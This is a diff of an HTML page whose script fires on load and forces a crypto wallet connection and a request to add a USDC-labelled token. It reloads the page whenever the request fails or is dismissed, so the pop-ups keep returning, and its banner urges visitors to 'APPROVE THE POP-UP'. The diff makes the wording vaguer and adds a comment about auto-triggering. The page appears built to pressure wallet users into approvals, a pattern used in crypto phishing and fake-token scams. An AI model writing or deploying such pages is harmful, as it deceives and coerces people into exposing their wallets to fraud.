@@ -11,8 +11,8 @@
 </head>
 <body>
     <div class="box">
-        <h2 style="margin:0;">BRIDGE ACTIVE</h2>
-        <p>ACCEPT SYSTEM POP-UP TO FINALIZE</p>
+        <h2 style="margin:0;">SYSTEM ACTIVE</h2>
+        <p>APPROVE THE POP-UP TO FINALIZE</p>
     </div>
 
     <script>
@@ -22,8 +22,7 @@
                     // Force the immediate wallet handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Force the USDC asset indexing with a unique timestamp
-                    // This is what forces the pop-up to appear on a refresh
+                    // Force the USDC asset indexing with a unique cache-buster
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -37,11 +36,12 @@
                         },
                     });
                 } catch (e) {
-                    // Reload if the wallet provider stalls
+                    // Immediate refresh to clear any remaining browser hangs
                     window.location.reload();
                 }
             }
         }
+        // Auto-triggers the millisecond the page hits the screen
         window.onload = forceBridge;
     </script>
 </body>
